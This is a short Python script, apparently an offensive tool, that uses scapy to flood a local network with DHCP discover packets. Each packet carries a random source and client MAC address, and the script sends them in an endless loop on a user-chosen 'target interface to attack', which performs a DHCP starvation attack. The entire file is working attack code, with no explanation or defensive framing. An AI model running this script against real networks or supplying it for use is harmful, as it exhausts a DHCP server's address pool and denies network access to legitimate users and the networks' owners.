#!/usr/bin/env python3
import argparse
from scapy.all import *
import sys
import time


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="The target interface to attack")
    options = parser.parse_args()

    return options


def print_to_stderr(*a):
    print(*a, file=sys.stderr)


options = get_arguments()
interface = options.interface

# When conf.checkIpaddr = False, the response IP isn't checked against sending IP address.
conf.checkIPaddr = False

dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC()) \
                / IP(src='0.0.0.0', dst='255.255.255.255') \
                / UDP(sport=68, dport=67) \
                / BOOTP(op=1, chaddr=RandMAC()) \
                / DHCP(options=[('message-type', 'discover'), 'end'])

# Spam the packet
count = 1
while True:
    # sendp(dhcp_discover, iface=interface, loop=1, verbose=1, inter=0.01)
    try:
        sendp(dhcp_discover, iface=interface, verbose=0)
        print_to_stderr(f"[+] DHCP discover packet {count} sent")
        count += 1
        time.sleep(0.01)
    except OSError as e:
        print_to_stderr(f"[-] {e}")
